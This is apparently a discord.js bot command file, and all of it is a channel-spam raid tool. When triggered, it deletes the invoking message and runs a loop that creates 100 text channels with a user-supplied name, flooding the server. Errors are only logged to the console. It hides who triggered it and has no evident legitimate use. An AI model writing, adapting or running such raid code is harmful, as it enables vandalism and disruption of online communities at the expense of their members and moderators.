const discord = require('discord.js')

exports.run = async (client, message, args) => {

    let name = args.slice(0).join(" ");
    message.delete();
    for (pas = 0; pas < 100; pas++) {
        message.guild.createChannel(name, "text").catch(error => {
            console.log(error)
        });
    }

}